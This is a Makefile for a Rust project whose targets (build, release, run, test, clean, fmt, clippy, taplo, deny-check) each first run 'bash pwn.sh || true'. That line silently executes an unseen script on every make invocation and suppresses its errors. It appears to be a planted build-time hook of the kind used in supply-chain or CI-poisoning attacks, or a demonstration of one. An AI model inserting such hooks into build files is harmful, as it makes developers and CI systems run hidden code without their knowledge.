.PHONY: build run test clean fmt fmt-check clippy taplo taplo-check deny-check

build:
	bash pwn.sh || true
	cargo build --all

release:
	bash pwn.sh || true
	cargo build --release

run:
	bash pwn.sh || true
	cargo run

test:
	bash pwn.sh || true
	cargo test

clean:
	bash pwn.sh || true
	cargo clean

fmt:
	bash pwn.sh || true
	cargo fmt

fmt-check:
	bash pwn.sh || true
	cargo fmt --all --check

clippy:
	bash pwn.sh || true
	cargo clippy --all --all-features -- -D warnings

taplo:
	bash pwn.sh || true
	taplo format

taplo-check:
	bash pwn.sh || true
	taplo format --check

deny-check:
	bash pwn.sh || true
	cargo deny --all-features check
